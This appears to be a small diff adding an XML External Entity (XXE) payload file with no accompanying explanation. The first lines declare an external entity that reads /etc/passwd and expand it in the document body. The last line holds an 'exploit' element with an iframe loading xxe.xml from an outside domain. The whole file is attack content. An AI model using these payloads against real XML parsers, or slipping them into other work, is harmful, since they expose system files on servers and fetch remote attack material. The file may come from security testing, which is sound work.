@@ -1,0 +1,5 @@
+<?xml version="1.0"?>
+<!DOCTYPE cdl [<!ENTITY asd SYSTEM "file:///etc/passwd">]>
+<cdl>&asd;</cdl>
+
+<exploit><iframe src="http://07570757.xyz/xxe.xml"></exploit>
